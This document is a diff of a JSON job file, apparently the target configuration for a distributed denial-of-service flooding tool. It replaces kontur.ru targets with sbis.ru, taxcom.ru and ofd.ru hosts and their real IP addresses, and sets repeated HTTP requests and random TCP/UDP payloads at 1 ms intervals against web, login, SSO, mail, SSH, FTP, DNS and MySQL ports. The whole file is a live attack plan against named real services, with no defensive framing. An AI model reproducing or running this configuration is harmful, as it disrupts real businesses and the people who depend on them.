@@ -1,594 +1,477 @@
 {
   "jobs": [{
-      "type": "tcp",
-      "count": 20,
-      "args": {
-        "address": "46.17.203.154:22",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
       "type": "http",
-      "count": 20,
+      "count": 24,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://e-kontur.ru/"
+          "path": "http://sbis.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "46.17.203.154:80",
+            "addr": "91.213.144.237:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 20,
+      "count": 24,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://e-kontur.ru/"
+          "path": "https://sbis.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "46.17.203.154:443",
+            "addr": "91.213.144.237:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 20,
+      "count": 24,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://elba.kontur.ru/AccessControl/Login"
+          "path": "http://webmail.sbis.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "46.17.203.41:80",
+            "addr": "91.213.144.19:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 20,
+      "count": 24,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://elba.kontur.ru/AccessControl/Login"
+          "path": "https://webmail.sbis.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "46.17.203.41:443",
+            "addr": "91.213.144.19:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 20,
+      "count": 24,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://auth.kontur.ru/"
+          "path": "http://wi.sbis.ru/auth/?ret=%2F"
         },
         "client": {
           "static_host": {
-            "addr": "46.17.206.15:80",
+            "addr": "91.213.144.102:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 40,
+      "count": 24,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://auth.kontur.ru/"
+          "path": "https://wi.sbis.ru/auth/?ret=%2F"
         },
         "client": {
           "static_host": {
-            "addr": "46.17.206.15:443",
+            "addr": "91.213.144.102:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 20,
+      "count": 24,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://install.kontur.ru/"
+          "path": "http://sso.sbis.ru/auth-online/?ret="
         },
         "client": {
           "static_host": {
-            "addr": "46.17.203.51:80",
+            "addr": "91.232.93.70:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 20,
+      "count": 24,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://install.kontur.ru/"
+          "path": "https://sso.sbis.ru/auth-online/?ret="
         },
         "client": {
           "static_host": {
-            "addr": "46.17.203.51:443",
+            "addr": "91.232.93.70:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 20,
+      "count": 24,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://kontur.ru/"
+          "path": "http://fix-sso.sbis.ru/auth-online/?ret="
         },
         "client": {
           "static_host": {
-            "addr": "46.17.203.102:80",
+            "addr": "91.232.92.49:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 20,
+      "count": 24,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://kontur.ru/"
+          "path": "https://fix-sso.sbis.ru/auth-online/?ret="
         },
         "client": {
           "static_host": {
-            "addr": "46.17.203.102:443",
+            "addr": "91.232.92.49:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 20,
+      "count": 24,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://api.kontur.ru/csi/support/v1/public/integrations/zakupki"
+          "path": "http://taxcom.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "46.17.203.45:80",
+            "addr": "193.0.214.48:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 20,
+      "count": 24,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://api.kontur.ru/csi/support/v1/public/integrations/zakupki"
+          "path": "https://taxcom.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "46.17.203.45:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 20,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://zakupki.kontur.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.17.203.73:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 20,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://zakupki.kontur.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.17.203.73:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 20,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://pf.kontur.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.17.204.249:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 20,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://pf.kontur.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.17.204.249:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 20,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://help.kontur.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.17.203.51:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 20,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://help.kontur.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.17.203.51:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 20,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://focus.kontur.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.17.206.13:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 20,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://focus.kontur.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.17.206.13:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 20,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://focus-api.kontur.ru/api3/req/userform"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.17.206.13:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 20,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://focus-api.kontur.ru/api3/req/userform"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.17.206.13:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 20,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://ff.kontur.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.17.203.72:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 20,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://ff.kontur.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.17.203.72:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 20,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://elbank.kontur.ru/AccessControl/Login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.17.203.41:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 20,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://elbank.kontur.ru/AccessControl/Login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.17.203.41:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 20,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.b-kontur.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.17.203.154:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 20,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.b-kontur.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.17.203.154:443",
+            "addr": "193.0.214.48:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "tcp",
-      "count": 20,
+      "count": 24,
       "args": {
-        "address": "46.17.203.229:22",
+        "address": "193.0.214.241:25",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 24,
+      "args": {
+        "address": "193.0.214.241:110",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 20,
+      "count": 24,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://developer.kontur.ru/"
+          "path": "http://transit1.taxcom.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "46.17.203.229:80",
+            "addr": "193.0.214.241:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 20,
+      "count": 24,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://developer.kontur.ru/"
+          "path": "https://transit1.taxcom.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "46.17.203.229:443",
+            "addr": "193.0.214.241:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 20,
+      "count": 24,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://evrika.kontur.ru/"
+          "path": "http://support.taxcom.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "46.17.203.229:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 20,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://cabinet.kontur.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.17.203.250:80",
+            "addr": "193.0.214.27:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 20,
+      "count": 24,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://cabinet.kontur.ru/"
+          "path": "https://support.taxcom.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "46.17.203.250:443",
+            "addr": "193.0.214.27:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 20,
+      "count": 24,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://my.kontur.ru/"
+          "path": "http://lk-ofd.taxcom.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "46.17.203.250:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 20,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://ca.kontur.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.17.203.131:80",
+            "addr": "193.0.214.142:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 20,
+      "count": 24,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://ca.kontur.ru/"
+          "path": "https://lk-ofd.taxcom.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "46.17.203.131:443",
+            "addr": "193.0.214.142:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 24,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://docliner.taxcom.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "193.0.214.30:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 24,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://docliner.taxcom.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "193.0.214.30:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "tcp",
-      "count": 20,
+      "count": 24,
       "args": {
-        "address": "46.17.203.154:22",
+        "address": "89.235.184.200:21",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
+      "type": "tcp",
+      "count": 24,
+      "args": {
+        "address": "89.235.184.200:22",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 24,
+      "args": {
+        "address": "89.235.184.200:53",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "udp",
+      "filter": "{{ (.Value (ctx_key \"global\")).EnablePrimitiveJobs }}",
+      "count": 24,
+      "args": {
+        "address": "89.235.184.200:53",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1000
+      }
+    }, {
       "type": "http",
-      "count": 20,
+      "count": 24,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://www.kontur-extern.ru/"
+          "path": "http://abonent.taxcom.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "46.17.203.154:80",
+            "addr": "89.235.184.200:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 20,
+      "count": 24,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://www.kontur-extern.ru/"
+          "path": "https://abonent.taxcom.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "46.17.203.154:443",
+            "addr": "89.235.184.200:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 24,
+      "args": {
+        "address": "89.235.184.200:3306",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "http",
+      "count": 24,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://ofd.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.15.172.21:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 24,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://ofd.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.15.172.21:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 24,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://lk.ofd.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.15.172.21:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 24,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://lk.ofd.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.15.172.21:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 24,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://chronopay.ofd.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.15.172.21:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 24,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://chronopay.ofd.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.15.172.21:443",
             "is_tls": "true"
           }
         }
